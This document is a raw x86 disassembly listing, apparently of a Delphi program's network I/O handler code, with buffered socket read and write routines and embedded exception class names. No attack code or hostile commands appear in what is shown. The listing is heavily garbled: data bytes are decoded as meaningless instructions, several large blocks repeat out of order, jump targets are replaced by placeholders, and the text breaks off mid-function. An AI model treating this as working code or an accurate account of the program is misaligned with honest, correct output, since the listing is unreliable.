mov [ fs : eax ] edx
push sub_471ea8
retn
sub_47223a
jmp r-xdata
inc esi
add [ eax ] cl
add bh bh
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09000e ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
and eax [ edi ]
or al 0x0
add [ eax ] al
movsb [ edi ] [ esi ]
and al [ edi ]
cwde
xor eax 0x35a40040
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ eax ] bl
inc ebp
dec ecx
dec esi
outsd
je r-xdata
inc ebp
outsb
xor eax 0x35a80040
outsb
outsd
jne r-xdata
je r-xdata
push esp
outsd
push edx
popad
sbb [ fs : edi + eax * 2 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
and al 0x47
push 0x61746144
dec ecx
outsb
inc edx
jne r-xdata
add [ eax ] al
movsb [ edi ] [ esi ]
and al [ edi ]
cwde
xor eax 0x35a40040
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
inc eax
add [ eax ] al
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + 0x47 ] dh
add [ eax + eax ] cl
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ edi ] cl
inc ebp
dec ecx
inc esi
imul ebp [ ebp + 0x4e ] 0x6f46746f
jne r-xdata
add [ eax + 0x4035 ] ah
outsd
outsb
outsb
arpl [ gs : ebp + 0x64 ] si
je r-xdata
add [ eax + eax ] cl
add [ eax ] al
movsb [ edi ] [ esi ]
and al [ edi ]
cwde
xor eax 0x35a40040
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ edi ] cl
inc ebp
dec ecx
dec esi
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ edi + eax * 2 ] ah
jb r-xdata
pop es
and eax 0xd2330047
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47251d
push [ fs : eax ]
mov [ fs : eax ] esp
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x30 ]
xor eax eax
push ebp
push sub_472500
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404164
jmp r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebp
jb r-xdata
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ edi ] cl
inc ebp
dec ecx
dec esi
outsd
inc esp
popad
je r-xdata
inc eax
add [ ebx + 0x47 ] bh
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0xc004723
add [ eax ] al
add [ edx + 0x35980047 ] ah
inc eax
add [ ebp + esi + 0x35a80040 ] ah
outsd
jb r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4726cc
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_40442c
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472507
xor edx edx
outsb
push edi
outsd
jb r-xdata
add [ eax - 0x80000000 ] al
push cs
add [ ecx ] cl
dec edi
rcl [ ebx + 0x47 ] 0x0
sub_472241
cmp [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or al 0x0
push es
dec edi
outsb
push edi
outsd
jb r-xdata
and al [ edi ]
or al 0x0
add [ eax ] al
lahf
inc esi
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
sub bl ch
inc esi
add [ eax ] al
add bh bh
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b000d ] al
outsb
push edi
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0xc004723
add [ eax ] al
add [ edx + 0x35980047 ] ah
inc eax
add [ ebp + esi + 0x35a80040 ] ah
outsd
jb r-xdata
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ 0x54644945 ] dl
inc ebx
push eax
inc ebx
outsd
outsb
outsb
inc eax
add [ ebx + esi ] bl
inc edx
imul ebp [ gs : bp - 0x78 ] 0x480046eb
add [ eax ] al
dec [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
je r-xdata
push esp
add [ eax - 0x80000000 ] al
push cs
add [ ecx ] cl
dec edi
outsb
push edi
outsd
jb r-xdata
rcl [ ebx + 0x47 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
and eax [ edi ]
or al 0x0
add [ eax ] al
movsb [ edi ] [ esi ]
and al [ edi ]
cwde
xor eax 0x35a40040
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ eax ] bl
inc ebp
dec ecx
dec esi
outsd
je r-xdata
inc ebp
outsb
add [ eax ] al
movsb [ edi ] [ esi ]
and al [ edi ]
cwde
xor eax 0x35a40040
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
inc eax
add [ eax ] al
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + 0x47 ] dh
add [ eax + eax ] cl
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ edi ] cl
inc ebp
dec ecx
inc esi
imul ebp [ ebp + 0x4e ] 0x6f46746f
jne r-xdata
add [ eax + 0x4035 ] ah
outsd
outsb
outsb
arpl [ gs : ebp + 0x64 ] si
je r-xdata
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ edi ] cl
inc ebp
dec ecx
dec esi
outsd
inc esp
popad
je r-xdata
xor eax 0x35a80040
outsb
outsd
jne r-xdata
pop es
and eax 0xd2330047
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47251d
push [ fs : eax ]
mov [ fs : eax ] esp
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x30 ]
xor eax eax
push ebp
push sub_472500
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404164
jmp r-xdata
outsd
push edx
popad
sbb [ fs : edi + eax * 2 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
and al 0x47
push 0x61746144
dec ecx
outsb
inc edx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
add [ eax + eax ] cl
add [ eax ] al
movsb [ edi ] [ esi ]
and al [ edi ]
cwde
xor eax 0x35a40040
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ edi ] cl
inc ebp
dec ecx
dec esi
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ edi + eax * 2 ] ah
jb r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4726cc
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_40442c
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472507
xor edx edx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebp
jb r-xdata
inc eax
add [ ebx + 0x47 ] bh
sub_47252c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] cl
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_4725f0
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
cmp [ edi + 0x69 ] 0x0
jne r-xdata
mov esi [ edi + 0x7c ]
test esi esi
je r-xdata
cmp [ edi + 0x7c ] 0x0
jne r-xdata
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x48 ]
test al al
je r-xdata
mov esi [ edi + 0x7c ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4725f7
lea eax [ ebp - 0x8 ]
call sub_404164
retn
mov eax [ edi + 0x74 ]
mov edx [ eax ]
call [ edx ]
cmp edx 0x0
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x5c ]
mov dl 0x4
mov eax edi
call sub_46ee24
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x48 ]
xor al 0x1
sete al
or al [ ebp - 0x1 ]
je r-xdata
cmp eax 0x0
test bl bl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
sub_472600
push ebx
push esi
mov ebx eax
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x48 ]
mov edx [ ebx + 0x7c ]
test edx edx
setne al
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x48 ]
sub_472628
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_46ed0c
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_470538
mov [ esi + 0x6c ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_470538
mov [ esi + 0x80 ] eax
push 0x0
push 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_47355c
mov [ esi + 0xa4 ] eax
mov [ esi + 0xa0 ] 0x8000
mov [ esi + 0xa8 ] 0x8000
push esi
push r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4739f0
mov [ esi + 0x74 ] eax
mov [ esi + 0x88 ] 0x4000
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_4726cc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_404164
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov edi [ ebx + 0x74 ]
mov eax edi
mov edx [ eax ]
call [ edx ]
mov edx eax
mov ecx esi
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x20 ]
pop edi
pop esi
pop ebx
retn
push 0x1
or ecx 0xffffffff
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x6c ]
sub_47270c
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x5c ]
cmp [ esi + 0x70 ] 0x0
je r-xdata
lea eax [ esi + 0x74 ]
call sub_40d490
lea eax [ esi + 0xa4 ]
call sub_40d490
lea eax [ esi + 0x80 ]
call sub_40d490
lea eax [ esi + 0x6c ]
call sub_40d490
mov edx ebx
and dl 0xfc
mov eax esi
call sub_46eda4
test bl bl
jle r-xdata
lea eax [ esi + 0x7c ]
call sub_40d490
mov [ esi + 0x70 ] 0x0
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_472770
push ebx
mov ebx eax
mov dl 0x3
mov eax ebx
call sub_46ee24
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
cmp [ ebx + 0x70 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov dl 0x4
mov eax ebx
call sub_46ee24
pop ebx
retn
lea eax [ ebx + 0x7c ]
call sub_40d490
mov [ ebx + 0x70 ] 0x0
sub_4727c8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_473768
push edi
mov ecx esi
mov eax [ ebx + 0x80 ]
mov dx [ eax + 0xc ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x50 ]
pop edi
pop esi
pop ebx
retn
sub_4727f0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_472841
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x80 ]
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax esi
call sub_40bb3c
call sub_403b1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472848
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_472850
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_4728a6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov esi [ ebx + 0x80 ]
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ esi + 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_46aa78
call sub_403b1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4728ad
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_4728b4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_472b4c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0xffffffff
jne r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
xor ecx ecx
mov dl [ ebp - 0x1 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x48 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebx + 0x9c ]
test eax eax
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor esi esi
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] 0xfffffffe
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472b53
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_404188
lea eax [ ebp - 0x10 ]
call sub_404164
retn
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov ecx [ ebx + 0xa4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0xc ] 0xffffffff
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
xor esi esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp [ ebx + 0x7c ] 0x0
je r-xdata
test esi esi
sete al
mov [ ebx + 0x69 ] al
test al al
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
mov eax [ ebx + 0xa0 ]
cdq
push edx
push eax
mov eax ecx
call sub_41ad9c
mov esi [ ebx + 0xa4 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x7c ]
mov esi [ eax ]
call [ esi + 0x54 ]
mov esi eax
jmp r-xdata
xor ecx ecx
mov dl [ ebp - 0x1 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x48 ]
mov [ ebp - 0xc ] esi
jmp r-xdata
push 0x1
mov [ ebp - 0x18 ] 0x274a
mov [ ebp - 0x14 ] 0x2745
lea ecx [ ebp - 0x18 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_46c228
test al al
je r-xdata
test esi esi
jne r-xdata
test esi esi
jle r-xdata
xor esi esi
cmp [ ebx + 0x7c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov eax esi
cdq
push edx
push eax
mov eax [ ebx + 0xa4 ]
call sub_41ad9c
cmp [ ebx + 0x78 ] 0x0
je r-xdata
mov eax [ ebx + 0x74 ]
mov edx [ eax ]
call [ edx ]
cmp edx 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x7c ]
mov ecx [ eax ]
call [ ecx + 0x50 ]
test al al
je r-xdata
jmp r-xdata
cmp [ ebx + 0x68 ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0xa4 ]
call sub_41ad38
mov edx [ ebx + 0xa4 ]
mov eax [ ebx + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov eax [ ebx + 0xa4 ]
mov edx [ eax ]
call [ edx ]
mov esi eax
cmp eax 0x0
jne r-xdata
mov cx 0x2
xor edx edx
mov eax [ ebx + 0x74 ]
mov edi [ eax ]
call [ edi + 0x14 ]
mov edi [ ebx + 0xa4 ]
mov eax edi
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ edi + 0x4 ]
mov eax [ ebx + 0x74 ]
call sub_41af7c
mov eax [ ebx + 0xa4 ]
mov edx [ eax ]
call [ edx ]
mov edx eax
test edx edx
jle r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46c2dc
mov eax 0x1
mov ecx [ ebx + 0xa4 ]
mov ecx [ ecx + 0x4 ]
mov cl [ ecx + eax ]
and cl 0x7f
push ecx
mov ecx [ ebx + 0xa4 ]
mov ecx [ ecx + 0x4 ]
lea edi [ ecx + eax ]
pop ecx
mov [ edi ] cl
inc eax
dec edx
jne r-xdata
sub_472b60
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_404614
xor eax eax
push ebp
push sub_472d7e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_404424
test eax eax
jne r-xdata
mov eax [ esi + 0x88 ]
mov [ ebp + 0xc ] eax
mov [ esi + 0x98 ] 0x0
mov [ esi + 0x99 ] 0x0
xor ebx ebx
xor eax eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4041fc
mov eax ebx
dec eax
cmp eax [ ebp + 0xc ]
jle r-xdata
mov eax [ esi + 0x74 ]
call sub_473ad4
mov edx eax
add edx [ ebp - 0xc ]
mov ecx edi
sub ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_46e310
mov ebx eax
test ebx ebx
jle r-xdata
test ebx ebx
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov [ ebp - 0xc ] edi
add ebx [ ebp - 0xc ]
test ebx ebx
jle r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0xc ]
jle r-xdata
cmp [ esi + 0x84 ] 0x0
jne r-xdata
mov eax [ esi + 0x74 ]
mov edx [ eax ]
call [ edx ]
mov edi eax
test edi edi
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_404424
mov edx eax
add edx ebx
dec edx
mov ecx [ ebp + 0x8 ]
mov eax [ esi + 0x74 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_404424
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404424
sub ebx eax
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404570
jne r-xdata
mov cl 0x1
mov dl 0x1
mov eax esi
mov edi [ eax ]
call [ edi + 0x48 ]
cmp [ ebp - 0x8 ] 0xffffffff
sete al
push eax
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax esi
mov edi [ eax ]
call [ edi + 0x6c ]
test eax eax
sete al
mov [ esi + 0x99 ] al
cmp [ esi + 0x99 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov [ esi + 0x98 ] 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax [ esi + 0x74 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx ebx
call sub_4047b0
test ebx ebx
jle r-xdata
mov eax [ ebp + 0x8 ]
call sub_404164
jmp r-xdata
cmp [ esi + 0x84 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472d85
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_404188
lea eax [ ebp - 0x4 ]
call sub_404164
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax + ebx - 0x1 ] 0xd
jne r-xdata
mov [ esi + 0x98 ] 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax [ esi + 0x74 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
jmp r-xdata
mov edx ebx
dec edx
mov eax [ ebp + 0x8 ]
call sub_4047b0
jmp r-xdata
sub_472d9c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_472e12
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404164
xor esi esi
jmp r-xdata
mov eax [ ebx ]
call sub_404424
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472e19
lea eax [ ebp - 0xc ]
call sub_404164
retn
cmp esi [ ebp - 0x8 ]
jl r-xdata
inc esi
push 0xffffffff
lea eax [ ebp - 0xc ]
push eax
or ecx 0xffffffff
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x70 ]
mov eax [ ebp - 0xc ]
mov edx ebx
call sub_408250
sub_472e23
inc [ ecx ]
add [ eax ] al
add [ edx ] cl
add [ eax ] al
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x5a178bbd ]
or eax [ eax ]
add dh al
inc ebx
imul eax [ eax ] 0x408dc35b
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
mov esi ecx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x7c ]
mov edx esi
mov ecx [ ebp + 0x8 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x60 ]
pop esi
pop ebx
pop ebp
retn 0x4
sub_472e64
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_4214a0
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x78 ]
jne r-xdata
cmp esi [ edi + 0x7c ]
jne r-xdata
xor eax eax
mov [ edi + 0x78 ] eax
xor eax eax
mov [ edi + 0x7c ] eax
sub_472eac
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x7c ] 0x0
je r-xdata
test esi esi
jne r-xdata
cmp [ ebx + 0x70 ] 0x0
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
xor eax eax
mov [ ebx + 0xac ] eax
jmp r-xdata
lea eax [ ebx + 0x7c ]
call sub_40d490
mov [ ebx + 0x70 ] 0x0
mov eax esi
mov [ ebx + 0x7c ] eax
test eax eax
je r-xdata
mov [ ebx + 0xac ] esi
pop esi
pop ebx
retn
mov edx ebx
call sub_421254
sub_472f04
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_404424
test eax eax
jle r-xdata
pop esi
pop ebx
retn
push 0x0
mov edx esi
mov ecx eax
mov eax ebx
call sub_472f28
sub_472f28
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_473128
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47312f
lea eax [ ebp - 0x1c ]
call sub_404164
retn
test esi esi
je r-xdata
mov cl 0x1
mov dl 0x1
mov eax ebx
mov edi [ eax ]
call [ edi + 0x48 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
mov eax [ ebx + 0xb0 ]
test eax eax
sete dl
or dl [ ebp + 0x8 ]
je r-xdata
mov edx esi
mov ecx [ ebp - 0x4 ]
call sub_41af7c
mov eax [ ebx + 0xb0 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov esi [ ebx + 0xb4 ]
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
push 0x0
push 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_47355c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4730a9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov ecx [ ebp - 0x4 ]
